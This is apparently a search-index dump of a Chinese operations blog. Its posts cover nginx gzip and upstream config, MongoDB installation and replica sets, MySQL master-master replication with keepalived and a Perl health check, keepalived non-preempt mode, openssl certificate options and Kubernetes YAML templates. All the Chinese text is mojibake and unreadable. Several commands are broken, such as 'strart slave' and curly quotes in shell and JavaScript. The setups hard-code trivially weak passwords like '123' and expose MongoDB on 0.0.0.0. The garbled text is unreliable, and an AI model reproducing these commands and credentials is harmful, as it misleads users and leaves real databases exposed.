1.1; ## å¯ç”¨å‹ç¼©æ—¶åè®®æœ€å°ç‰ˆæœ¬ gzip_vary on; gzip_proxied any; ## ä¸ºæ‰€æœ‰ä»£ç†è¯·æ±‚å¯ç”¨å‹ç¼© gzip_min_length 1024; ## è®¾ç½®å°†è¢«gzipå‹ç¼©çš„å“åº”çš„æœ€å°é•¿åº¦ gzip_comp_level 6; ## è®¾ç½®å‹ç¼©ç­‰çº§ gzip_buffers 16 8k; ## è®¾ç½®ç”¨äºå‹ç¼©å“åº”çš„ç¼“å†²åŒºnumberå’Œsize gzip_proxied expired no-cache no-store private auth no_last_modified no_etag; gzip_types text/plain application/x-javascript text/css application/xml application/json; gzip_disable \"MSIE [1-6]\\.(?!.*SV1)\"; upstream tomcat8080 { ip_hash; server 172.16.100.103:8080 weight=1 max_fails=2; server 172.16.100.104:8080 weight=1 max_fails=2; server 172.16.100.105:8080 weight=1 max_fails=2; } server { listen 80; server_name www.chan.com; # config_apps_begin root /data/webapps/htdocs; access_log /var/logs/webapp.access.log main; error_log /var/logs/webapp.error.log notice; location / { location ~* ^.*/favicon.ico$ { root /data/webapps; expires 180d; ## ç¼“å­˜180å¤© break; } if ( !-f $request_filename ) { proxy_pass http://tomcat8080; break; } } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } server { listen 8088; server_name nginx_status; location / { access_log off; deny all; return 503; } location /status { stub_status on; access_log off; allow 127.0.0.1; allow 172.16.100.71; deny all; } } } ","date":"2019-12-24 13:14","objectID":"/post/1316/:0:0","tags":["nginx"],"title":"nginxç”Ÿäº§ç¯å¢ƒé…ç½®æ¡ˆä¾‹","uri":"/post/1316/"},{"categories":["databases"],"content":"å®‰è£…mongodb å¯å‚è€ƒï¼šhttps://soulchild.cn/1279.html ç¯å¢ƒï¼š 10.0.0.40Â mongodb-01 10.0.0.41Â mongodb-02 10.0.0.42Â mongodb-arb ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š # ç³»ç»Ÿæ—¥å¿—ç›¸å…³ systemLog: destination: file logAppend: true path: /application/mongodb/log/mongod.log # æ•°æ®å­˜å‚¨ç›¸å…³ storage: dbPath: /application/mongodb/data journal: enabled: true # ç½‘ç»œç›¸å…³ net: port: 27017 bindIp: 0.0.0.0 # è¿›ç¨‹æ§åˆ¶ç›¸å…³ processManagement: fork: true # pidFilePath: /var/run/mongod.pid # å®‰å…¨é…ç½® #security: # authorization: enable # keyFile: /application/mongodb/data/keyfile #å¤åˆ¶é›†é…ç½® replication: oplogSizeMB: 2048 replSetName: app_1 é…ç½®å¤åˆ¶é›† #ç™»é™†ä¸»mongo mongo conf = { _id: 'app_1', members: [ {_id: 0, host: '10.0.0.40:27017',priority:10}, {_id: 1, host: '10.0.0.41:27017',priority:9}, {_id: 2, host: '10.0.0.42:27017',\"arbiterOnly\": true} ] } #åˆå§‹åŒ–pepeié…ç½® rs.initiate(conf) #Â æŸ¥çœ‹çŠ¶æ€ rs.status() æ·»åŠ è¶…çº§ç®¡ç†å‘˜ # è¿æ¥æ•°æ®åº“ mongo # åˆ‡æ¢åˆ°adminåº“ use admin # åˆ›å»ºç”¨æˆ· db.createUser( { user: \"root\", pwd: \"123\", roles: [{ role:\"root\",db:\"admin\"}] } ) ç”Ÿæˆè®¤è¯keyfile openssl rand -base64 512 \u003e /application/mongodb/data/keyfile é…ç½®æ–‡ä»¶æ·»åŠ å®‰å…¨é…ç½® security: authorization: enable keyFile: /application/mongodb/data/keyfile é‡å¯æ‰€æœ‰èŠ‚ç‚¹ ","date":"2019-12-20 16:51","objectID":"/post/1294/:0:0","tags":["mongodb"],"title":"mongodbä¸€ä¸»ä¸€ä»ä¸€Arbiterå¤åˆ¶é›†éƒ¨ç½²","uri":"/post/1294/"},{"categories":["databases"],"content":"åˆ›å»ºè¶…çº§ç®¡ç†å‘˜ db.createUser( { user:\"root\", pwd:\"123\", roles:[{role:\"root\",db:\"admin\"}] } ) åˆ›å»ºæ™®é€šè¯»å†™ç”¨æˆ· db.createUser( { user:\"root\", pwd:\"123\", roles:[{role:\"readWrite\",db:\"app\"}] } ) æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ· db.system.users.find().pretty() ä¿®æ”¹ç”¨æˆ·å¯†ç  db.updateUser(\"admin\",{pwd:\"password\"}) åˆ é™¤ç”¨æˆ· db.system.users.remove({user:\"app1\"}) åˆ›å»ºé›†åˆï¼š db.createCollection(\"runoob\") åˆ›å»ºæ–‡æ¡£ï¼š #appä¸ºåº“å db.app.insert( { key1: \"value1\", key2: \"value2\" } ) æŸ¥çœ‹é›†åˆæ–‡æ¡£ db.app.find().pretty() è¿æ¥ä¿¡æ¯æŸ¥è¯¢ db.serverStatus().connections ","date":"2019-12-20 14:47","objectID":"/post/1292/:0:0","tags":["mongodb"],"title":"mongodbå¸¸ç”¨å‘½ä»¤","uri":"/post/1292/"},{"categories":["databases"],"content":"å•æœºéƒ¨ç½²4å®ä¾‹ï¼š ç«¯å£ï¼š27017 27018 27019 27020 å‡†å¤‡å®ä¾‹ï¼š Â  åˆ›å»ºç›®å½•ï¼š mkdir -p /application/mongodb/{27017..27020}/conf /application/mongodb/{27017..27020}/data /application/mongodb/{27017..27020}/log ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š cat \u003e /application/mongodb/27017/conf/mongo.conf \u003c\u003cEOF # ç³»ç»Ÿæ—¥å¿—ç›¸å…³ systemLog: destination: file logAppend: true path: /application/mongodb/27017/log/mongod.log # æ•°æ®å­˜å‚¨ç›¸å…³ storage: dbPath: /application/mongodb/27017/data journal: enabled: true directoryPerDB: true wiredTiger: engineConfig: cacheSizeGB: 1 directoryForIndexes: true collectionConfig: blockCompressor: zlib indexConfig: prefixCompression: true # ç½‘ç»œç›¸å…³ net: port: 27017 bindIp: 0.0.0.0 # è¿›ç¨‹æ§åˆ¶ç›¸å…³ processManagement: fork: true # å®‰å…¨é…ç½® #security: # authorization: enabled #å¤åˆ¶é›†é…ç½® replication: oplogSizeMB: 2048 replSetName: repl_1 EOF åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š cd /application/mongodb cp 27017/conf/mongo.conf ./27018/conf/mongo.conf cp 27017/conf/mongo.conf ./27019/conf/mongo.conf cp 27017/conf/mongo.conf ./27020/conf/mongo.conf sed -i 's#27017#27018#' ./27018/conf/mongo.conf sed -i 's#27017#27019#' ./27019/conf/mongo.conf sed -i 's#27017#27020#' ./27020/conf/mongo.conf å¯åŠ¨å¤šå®ä¾‹ï¼š su - mongod mongod -f /application/mongodb/27017/conf/mongo.conf mongod -f /application/mongodb/27018/conf/mongo.conf mongod -f /application/mongodb/27019/conf/mongo.conf mongod -f /application/mongodb/27020/conf/mongo.conf é…ç½®å¤åˆ¶é›†ï¼š Â  ä¸€ä¸»ä¸¤ä»ï¼š Â  mongo --port 27017 admin conf =Â { _id: â€˜repl_1â€™, members: [ {_id: 0, host: â€˜10.0.0.40:27017â€™}, {_id: 1, host: â€˜10.0.0.40:27018â€™}, {_id: 2, host: â€˜10.0.0.40:27019â€™} ] } rs.initiate(conf) #æŸ¥è¯¢å¤åˆ¶é›†çŠ¶æ€ rs.status() ä¸€ä¸»ä¸€ä»ä¸€arbiterï¼š *ArbiterèŠ‚ç‚¹åªä¼šå‚ä¸æŠ•ç¥¨* #æ–°é…ç½® mongo --port 27017 admin conf =Â { _id: â€˜repl_1â€™, members: [ {_id: 0, host: â€˜10.0.0.40:27017â€™}, {_id: 1, host: â€˜10.0.0.40:27018â€™}, {_id: 2, host: â€˜10.0.0.40:27019â€™,â€œarbiterOnlyâ€: true} ] } #åˆå§‹åŒ–é…ç½® rs.initiate(conf) #æŸ¥è¯¢å¤åˆ¶é›†çŠ¶æ€ rs.status() åŸºäºä¸€ä¸»ä¸¤ä»ä¿®æ”¹ï¼š # åˆ é™¤èŠ‚ç‚¹ rs.remove(\"10.0.0.40:27019\") #æ·»åŠ arbiterèŠ‚ç‚¹ rs.addArb(\"10.0.0.40:27019\") #å¯åŠ¨æœåŠ¡ mongod -f /application/mongodb/27019/conf/mongo.conf å…¶ä»–ç›¸å…³å‘½ä»¤ï¼š æ·»åŠ åˆ é™¤èŠ‚ç‚¹ï¼š # åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹ rs.remove(\"ip:port\") #æ·»åŠ æ™®é€šèŠ‚ç‚¹ rs.add(\"ip:port\") #æ·»åŠ ArbiterèŠ‚ç‚¹ rs.addArb(\"ip:port\") #å°†å½“å‰ä¸»åº“é™çº§ rs.stepDown() æµ‹è¯•ï¼š # åˆ›å»ºä¸€ä¸ªcollection db.createCollection(\"user_info\") # å…³é—­port:27018ä¸»åº“æœåŠ¡ mongod -f /application/mongodb/27018/conf/mongo.conf --shutdown # è¿æ¥27017 mongo repl_1:PRIMARY\u003e show dbs admin 0.000GB app 0.000GB config 0.000GB local 0.000GB repl_1:PRIMARY\u003e use app switched to db app repl_1:PRIMARY\u003e show collections user_info repl_1:PRIMARY\u003e ","date":"2019-12-20 14:24","objectID":"/post/1285/:0:0","tags":["mongodb"],"title":"mongodbå¤åˆ¶é›†","uri":"/post/1285/"},{"categories":["databases"],"content":"ä¸‹è½½åœ°å€ï¼š http://downloads.mongodb.org/linux/mongodb-linux-x86_64-rhel70-v3.6-latest.tgz å®‰è£…ï¼š mkdir /application tar xfÂ mongodb-linux-x86_64-rhel70-v3.6-latest.tgz -C /application/ cd /application mv mongodb-linux-x86_64-rhel70-3.6.16-15-g4cd114f/ mongodb echo 'export PATH=$PATH:/application/mongodb/bin' \u0026gt;\u0026gt;/etc/profile sourceÂ /etc/profile # åˆ›å»ºç”¨æˆ· groupadd mongod useradd -g mongod mongod echo 123456 |passwd --stdin mongod #åˆ›å»ºç›®å½• cd /application/mongodb mkdir conf log data chownÂ -RÂ mongod.mongodÂ /application/mongodb å…³é—­å¤§é¡µå†…å­˜ echo 'never' \u0026gt;\u0026gt; /sys/kernel/mm/transparent_hugepage/enabled echo 'never' \u0026gt;\u0026gt; /sys/kernel/mm/transparent_hugepage/defrag ç¼–å†™é…ç½®æ–‡ä»¶ # ç³»ç»Ÿæ—¥å¿—ç›¸å…³ systemLog: destination: file logAppend: true path: /application/mongodb/log/mongod.log # æ•°æ®å­˜å‚¨ç›¸å…³ storage: dbPath: /application/mongodb/data journal: enabled: true # ç½‘ç»œç›¸å…³ net: port: 27017 bindIp: 0.0.0.0 # è¿›ç¨‹æ§åˆ¶ç›¸å…³ processManagement: fork: true # pidFilePath: /var/run/mongod.pid # å®‰å…¨é…ç½® security: authorization: enabled å¯åŠ¨mongodb su - mongod #æ— é…ç½®æ–‡ä»¶å¯åŠ¨ mongod --dbpath=/application/mongodb/data --logpath=/application/mongodb/log/mongodb.log --logappend --fork #ä½¿ç”¨é…ç½®æ–‡ä»¶å¯åŠ¨ su - mongod mongodÂ -fÂ /application/mongodb/conf/mongo.conf å¯åŠ¨è„šæœ¬ [Unit] Description=Mongos server Wants=network.target After=network.target [Service] Type=forking PIDFile=/data/mongodb/mongod.pid ExecStart=/application/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf ExecReload=/bin/kill -HUP $MAINPID Restart=on-failure User=mongod Group=mongod LimitNOFILE=65534 LimitNPROC=65534 [Install] WantedBy=multi-user.target åˆ›å»ºmongodbè¶…çº§ç®¡ç†ç”¨æˆ·ï¼š use admin db.createUser( { user:\"root\", pwd:\"123\", roles:[ { role: \"root\", db:\"admin\" } ] } ) è¿æ¥æ•°æ®åº“ mongo -uroot -p123 10.0.0.40/admin æˆ–è€… mongo useÂ admin db.auth('root','123') åˆ›å»ºæ™®é€šè¯»å†™ç”¨æˆ·ï¼š use app db.createUser( { user: \"app1\", pwd: \"app1\", roles: [ { role: \"readWrite\", db: \"app\" } ] } ) å…³é—­æ•°æ®åº“ mongod -f conf/mongo.conf --shutdown ","date":"2019-12-20 11:08","objectID":"/post/1279/:0:0","tags":["mongodb"],"title":"mongodb3.6äºŒè¿›åˆ¶å®‰è£…","uri":"/post/1279/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ç¯å¢ƒï¼š mysql-master-01ï¼š10.0.0.30 mysql-master-02ï¼š10.0.0.35 vipï¼š10.0.0.39 å®‰è£…mysql5.7.20 å¯å‚è€ƒï¼šhttps://soulchild.cn/266.html å¼€å§‹é…ç½®ä¸»ä¸»ç¯å¢ƒ ä¸€ã€ä¿®æ”¹mysqlé…ç½® master-01ï¼š [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=information_schema.% [mysql] socket=/tmp/mysql.sock prompt=master-01[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log master-02ï¼š [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=11 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=information_schema.% [mysql] socket=/tmp/mysql.sock prompt=master-02[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log äºŒã€é…ç½®msater-01ä¸»,master-02ä» 1.æ·»åŠ ä¸»ä»å¤åˆ¶ç”¨æˆ·ï¼Œmaster-01æ‰§è¡Œ grant replication slave on *.* to 'repl'@'10.0.0.%' identified by 'replpass'; grant all on blog.* to 'blog'@'10.0.0.%' identified by 'blog123'; #è®°å½•ä¸¤ä¸ªå€¼Fileå’ŒPosition showÂ masterÂ status; 2.master-02ä¸­æ‰§è¡Œï¼ŒæŒ‡å®šmaster-01æœåŠ¡å™¨ä½œä¸ºä¸»æœåŠ¡å™¨ #mysql-bin.000001å’Œ704ä¸ºä¸Šé¢è·å–çš„å€¼ change master to master_host='10.0.0.30',master_user='repl',master_password='replpass',master_log_file='mysql-bin.000001',master_log_pos=704; strartÂ slave; showÂ slaveÂ status\\G ä¸‰ã€é…ç½®msater-02ä¸»,master-01ä» 1.æ·»åŠ ä¸»ä»å¤åˆ¶ç”¨æˆ·ï¼Œmaster-02æ‰§è¡Œ grant replication slave on *.* to 'repl'@'10.0.0.%' identified by 'replpass'; grant all on blog.* to 'blog'@'10.0.0.%' identified by 'blog123'; #è®°å½•ä¸¤ä¸ªå€¼Fileå’ŒPosition showÂ masterÂ status; 2.master-01ä¸­æ‰§è¡Œï¼ŒæŒ‡å®šmaster-02æœåŠ¡å™¨ä½œä¸ºä¸»æœåŠ¡å™¨ #mysql-bin.000003å’Œ704ä¸ºä¸Šé¢è·å–çš„å€¼ change master to master_host='10.0.0.35',master_user='repl',master_password='replpass',master_log_file='mysql-bin.000003',master_log_pos=704; strartÂ slave; showÂ slaveÂ status\\G æµ‹è¯•æ•°æ®åŒæ­¥ï¼š master-01[blog]\u003ecreate database blog; master-01[blog]\u003euse blog; master-01[blog]\u003ecreate table user( `username` char(10), `password` char(10) ); master-02[blog]\u003eshow databases; master-02[blog]\u003euse blog; master-02[blog]\u003eshow tables; master-02[blog]\u003einsert into `user` (username,password) values('li','123'); master-01[blog]\u003eselect * from user; å››ã€å®‰è£…é…ç½®keepalived 1.ä¸¤ä¸ªèŠ‚ç‚¹å®‰è£… yum install -y keepalived master-01çš„keepalivedé…ç½®æ–‡ä»¶ï¼ˆæ­¤é…ç½®æœªè€ƒè™‘è„‘è£‚é—®é¢˜ï¼‰ï¼š global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id mysql-master-01 } vrrp_script check_mysql { script \"/server/scripts/keepalived/check_mysql.pl\" interval 2 } vrrp_instance mysql { state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.39 } track_script { check_mysql } } master-02çš„keepalivedé…ç½®æ–‡ä»¶ global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id mysql-master-02 } vrrp_script check_mysql { script \"/server/scripts/keepalived/check_mysql.pl\" interval 2 } vrrp_instance mysql { state BACKUP interface eth0 virtual_router_id 51 priority 80 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.39 } track_script { check_mysql } } 2.ç¼–å†™çŠ¶æ€æ£€æµ‹è„šæœ¬ mkdir /server/scripts/keepalived/ -p cdÂ /server/scripts/keepalived/ vimÂ check_mysql.pl è„šæœ¬ #!/usr/bin/perl -w use DBI; use DBD::mysql; # CONFIG VARIABLES $SBM = 120; $db = \"mysql\"; $host = $ARGV[0]; $port = 3306; $user = \"root\"; $pw = \"123456\"; # SQL query $query = \"show slave status\"; $dbh = DBI-\u003econnect(\"DBI:mysql:$db:$host:$port\", $user, $pw, { RaiseError =\u003e 0,PrintError =\u003e 0 }); if (!defined($dbh)) { exit 1; } $sqlQuery = $dbh-\u003eprepare($query); $sqlQuery-\u003eexecute; $Slave_IO_Running = \"\"; $Slave_SQL_Running = \"\"; $Seconds_Behind_Master = \"\"; while (my $ref = $sqlQuery-\u003efetchrow_hashref()) { $Slave_IO_Running = $ref-\u003e{'Slave_IO_Running'}; $Slave_SQL_Running = $ref-\u003e{'Slave_SQL_Running'}; $Seconds_Behind_Master = $ref-\u003e{'Seconds_Behind_Master'}; } $sqlQuery-\u003efinish; $dbh-\u003edisconnect(); if ( $Sla","date":"2019-12-19 18:46","objectID":"/post/1264/:0:0","tags":["keepalievd","mysql"],"title":"mysqlä¸»ä¸»å¤åˆ¶+keepalivedéƒ¨ç½²","uri":"/post/1264/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸»è¦æœ‰ä¸¤ä¸ªæ”¹åŠ¨ï¼š 1.å°†æ‰€æœ‰è§’è‰²æ”¹ä¸ºBACKUP 2.åœ¨ä¼˜å…ˆçº§é«˜çš„èŠ‚ç‚¹æ·»åŠ nopreempté…ç½® MASTERé…ç½® global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-01 } # å®šä¹‰ä¸€ä¸ªçŠ¶æ€æ£€æŸ¥,scriptä¸­ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½†è„šæœ¬éœ€æœ‰è¿”å›å€¼0æˆ–é0 vrrp_script check_nginx { # æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡nginxè¿›ç¨‹çŠ¶æ€ï¼Œæ ¹æ®å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç å»åˆ¤æ–­æœåŠ¡æ˜¯å¦æ­£å¸¸ script \"/usr/bin/killall -0 nginx\" interval 2 # 2æ¬¡çŠ¶æ€å—ä¸ºé0æ‰ä¸ºå¤±è´¥çŠ¶æ€ fall 2 # 2æ¬¡çŠ¶æ€ç ä¸º0æ‰ä¸ºæ­£å¸¸çŠ¶æ€ rise 2 } vrrp_instance nginx { # è®¾ç½®ä¸ºBACKUP state BACKUP # æŒ‡å®šç½‘å¡ interface eth0 # vrrpæ ‡è¯†1-255(éœ€è¦å’Œå¤‡èŠ‚ç‚¹ä¸€è‡´) virtual_router_id 51 # æŒ‡å®šä¼˜å…ˆçº§ï¼Œå€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ priority 100 # ç»„æ’­åŒ…é—´éš”æ—¶é—´ advert_int 1 # å¼€å¯éæŠ¢å æ¨¡å¼ nopreempt # è®¤è¯ authentication { auth_type PASS auth_pass 1111 } # é…ç½®vip virtual_ipaddress { 10.0.0.3 } # æŒ‡å®šè¿›å…¥ä¸åŒçŠ¶æ€æ—¶è¦æ‰§è¡Œçš„è„šæœ¬ #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" # å¼•ç”¨ä¸Šé¢å®šä¹‰çš„çŠ¶æ€æ£€æŸ¥ track_script { check_nginx } } BACKUPé…ç½® global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-02 } vrrp_script check_nginx { script \"/usr/bin/killall -0 nginx\" interval 2 fall 2 rise 2 } vrrp_instance nginx { state BACKUP interface eth0 virtual_router_id 51 priority 50 advert_int 1 authentication { auth_type PASS auth_pass 1111 } #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" virtual_ipaddress { 10.0.0.3 } track_script { check_nginx } } ","date":"2019-12-19 11:21","objectID":"/post/1254/:0:0","tags":["keepalievd"],"title":"keepalivedå¼€å¯éæŠ¢å æ¨¡å¼","uri":"/post/1254/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤","kubernetes"],"content":"ä¸»è¦é€‰é¡¹ï¼š -in filenameÂ ï¼š #æŒ‡å®šè¯ä¹¦è¾“å…¥æ–‡ä»¶ï¼Œè‹¥åŒæ—¶æŒ‡å®šäº†\"-req\"é€‰é¡¹ï¼Œåˆ™è¡¨ç¤ºè¾“å…¥æ–‡ä»¶ä¸ºè¯ä¹¦è¯·æ±‚æ–‡ä»¶ã€‚ -out filenameÂ ï¼š #æŒ‡å®šè¾“å‡ºæ–‡ä»¶ -md2|-md5|-sha1|-mdc2ï¼š #æŒ‡å®šå•å‘åŠ å¯†çš„ç®—æ³•ã€‚ æŸ¥çœ‹è¯ä¹¦é€‰é¡¹ï¼š -textÂ ï¼šä»¥textæ ¼å¼è¾“å‡ºè¯ä¹¦å†…å®¹ï¼Œå³ä»¥æœ€å…¨æ ¼å¼è¾“å‡ºï¼Œ ï¼šåŒ…æ‹¬public key,signature algorithms,issuerå’Œsubject names,serial numberä»¥åŠany trust settings. -certopt optionï¼šè‡ªå®šä¹‰è¦è¾“å‡ºçš„é¡¹ -nooutÂ ï¼šç¦æ­¢è¾“å‡ºè¯ä¹¦è¯·æ±‚æ–‡ä»¶ä¸­çš„ç¼–ç éƒ¨åˆ† -pubkeyÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­çš„å…¬é’¥ -modulusÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­å…¬é’¥æ¨¡å—éƒ¨åˆ† -serialÂ ï¼šè¾“å‡ºè¯ä¹¦çš„åºåˆ—å· -subjectÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­çš„subject -issuerÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­çš„issuerï¼Œå³é¢å‘è€…çš„subject -subject_hashï¼šè¾“å‡ºè¯ä¹¦ä¸­subjectçš„hashç  -issuer_hashÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­issuer(å³é¢å‘è€…çš„subject)çš„hashç  -hashÂ ï¼šç­‰ä»·äº\"-subject_hash\"ï¼Œä½†æ­¤é¡¹æ˜¯ä¸ºäº†å‘åå…¼å®¹æ‰æä¾›çš„é€‰é¡¹ -emailÂ ï¼šè¾“å‡ºè¯ä¹¦ä¸­çš„emailåœ°å€ï¼Œå¦‚æœæœ‰emailçš„è¯ -startdateÂ ï¼šè¾“å‡ºè¯ä¹¦æœ‰æ•ˆæœŸçš„èµ·å§‹æ—¥æœŸ -enddateÂ ï¼šè¾“å‡ºè¯ä¹¦æœ‰æ•ˆæœŸçš„ç»ˆæ­¢æ—¥æœŸ -datesÂ ï¼šè¾“å‡ºè¯ä¹¦æœ‰æ•ˆæœŸï¼Œç­‰ä»·äº\"startdate+enddate\" -fingerprintÂ ï¼šè¾“å‡ºæŒ‡çº¹æ‘˜è¦ä¿¡æ¯ æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶è¯ä¹¦ï¼š openssl x509 -in apiserver.crt -text -noout ","date":"2019-12-18 09:43","objectID":"/post/1242/:0:0","tags":[],"title":"æŸ¥çœ‹è¯ä¹¦è¿‡æœŸæ—¶é—´","uri":"/post/1242/"},{"categories":["å…¶ä»–"],"content":"defaults delete com.googlecode.iterm2 ","date":"2019-12-17 16:34","objectID":"/post/1239/:0:0","tags":[],"title":"iterm2æ¢å¤é»˜è®¤é…ç½®","uri":"/post/1239/"},{"categories":["kubernetes"],"content":"deployment apiVersion: v1 kind: Service metadata: labels: app: {name} name: {name} namespace: {namespace} spec: ports: - port: {cluster ipç«¯å£} protocol: TCP targetPort: {å®¹å™¨ç«¯å£} nodePort: {å®¿ä¸»æœºç«¯å£} selector: app: {name} type: NodePort --- apiVersion: apps/v1 kind: Deployment metadata: name: {name} namespace: {namespace} spec: replicas: 1 selector: matchLabels: app: {name} template: metadata: labels: app: {name} #å’ŒmatchLabelsä¸­çš„ä¸€è‡´ spec: imagePullSecrets: - name: {secret} containers: - name: {container-name} image: {image_name} ports: - containerPort: {å®¹å™¨ç«¯å£} command: ['java'] args: ['-Dspring.profiles.active=test','-jar','xx.jar'] volumeMounts: # å°†å­˜å‚¨å·æŒ‚è½½åˆ°å®¹å™¨ä¸­ - name: {name} # æŒ‡å®šä½¿ç”¨å“ªä¸ªå­˜å‚¨å· mountPath: \"/data/www/images\" volumes: #å®šä¹‰å­˜å‚¨å· - name: {volumes_name} #å®šä¹‰å­˜å‚¨å·åç§° persistentVolumeClaim: claimName: {pvc_name} #æŒ‡å®šä½¿ç”¨å“ªä¸ªpvc ","date":"2019-12-16 16:40","objectID":"/post/1226/:1:0","tags":["k8s"],"title":"ç®€ç•¥ç‰ˆdeploymentã€pvã€pvcèµ„æºæ–‡ä»¶æ¨¡æ¿","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"pv apiVersion: v1 kind: PersistentVolume metadata: name: {name} spec: capacity: storage: 40Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain nfs: path: \"/nfsdata/xxx\" server: 10.0.0.10 readOnly: false ","date":"2019-12-16 16:40","objectID":"/post/1226/:2:0","tags":["k8s"],"title":"ç®€ç•¥ç‰ˆdeploymentã€pvã€pvcèµ„æºæ–‡ä»¶æ¨¡æ¿","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"pvc kind: PersistentVolumeClaim apiVersion: v1 metadata: name: {name} namespace: {namespace} spec: accessModes: - ReadWriteMany resources: requests: storage: 40Gi ","date":"2019-12-16 16:40","objectID":"/post/1226/:3:0","tags":["k8s"],"title":"ç®€ç•¥ç‰ˆdeploymentã€pvã€pvcèµ„æºæ–‡ä»¶æ¨¡æ¿","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"#æ— yamlé‡å¯pod kubectl get pod â€œPODNAMEâ€ -n â€œNAMESPACEâ€ -o yaml | kubectl replace â€“force -f - #æŸ¥è¯¢dashboardçš„token kubectl describe secrets -n kube-system kubectl get secret -n kube-system | awk '/dashboard-admin/{print $1}' | grep token: | awk â€˜{print $2}â€™ ","date":"2019-12-16 16:27","objectID":"/post/1223/:0:0","tags":["k8s"],"title":"k8sæŸ¥è¯¢dashboardçš„token","uri":"/post/1223/"},{"categories":["databases"],"content":"1.ç”¨æˆ·æƒé™è¯´æ˜ Aï¼MongoDBæ˜¯æ²¡æœ‰é»˜è®¤ç®¡ç†å‘˜è´¦å·ï¼Œæ‰€ä»¥è¦å…ˆæ·»åŠ ç®¡ç†å‘˜è´¦å·ï¼Œå†å¼€å¯æƒé™è®¤è¯ã€‚ Bï¼åˆ‡æ¢åˆ°adminæ•°æ®åº“ï¼Œæ·»åŠ çš„è´¦å·æ‰æ˜¯ç®¡ç†å‘˜è´¦å·ã€‚ Cï¼ç”¨æˆ·åªèƒ½åœ¨åˆ›å»ºç”¨æˆ·å¯¹åº”çš„æ•°æ®åº“ä¸­å®Œæˆè®¤è¯ï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜è´¦å·ã€‚ Dï¼ç®¡ç†å‘˜å¯ä»¥ç®¡ç†æ‰€æœ‰æ•°æ®åº“ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ç®¡ç†å…¶ä»–æ•°æ®åº“ï¼Œè¦å…ˆåœ¨adminæ•°æ®åº“è®¤è¯åæ‰å¯ä»¥ã€‚ 2.MongoDBæ•°æ®åº“è§’è‰² A.æ•°æ®åº“ç”¨æˆ·è§’è‰²ï¼šreadã€readWrite; B.æ•°æ®åº“ç®¡ç†è§’è‰²ï¼šdbAdminã€dbOwnerã€userAdminï¼› C.é›†ç¾¤ç®¡ç†è§’è‰²ï¼šclusterAdminã€clusterManagerã€clusterMonitorã€hostManagerï¼› D.å¤‡ä»½æ¢å¤è§’è‰²ï¼šbackupã€restoreï¼› E.æ‰€æœ‰æ•°æ®åº“è§’è‰²ï¼šreadAnyDatabaseã€readWriteAnyDatabaseã€userAdminAnyDatabaseã€dbAdminAnyDatabase F.è¶…çº§ç”¨æˆ·è§’è‰²ï¼šroot è§’è‰²è¯´æ˜ï¼š Readï¼šå…è®¸ç”¨æˆ·è¯»å–æŒ‡å®šæ•°æ®åº“ readWriteï¼šå…è®¸ç”¨æˆ·è¯»å†™æŒ‡å®šæ•°æ®åº“ dbAdminï¼šå…è®¸ç”¨æˆ·åœ¨æŒ‡å®šæ•°æ®åº“ä¸­æ‰§è¡Œç®¡ç†å‡½æ•°ï¼Œå¦‚ç´¢å¼•åˆ›å»ºã€åˆ é™¤ï¼ŒæŸ¥çœ‹ç»Ÿè®¡æˆ–è®¿é—®system.profile userAdminï¼šå…è®¸ç”¨æˆ·å‘system.usersé›†åˆå†™å…¥ï¼Œå¯ä»¥æ‰¾æŒ‡å®šæ•°æ®åº“é‡Œåˆ›å»ºã€åˆ é™¤å’Œç®¡ç†ç”¨æˆ· 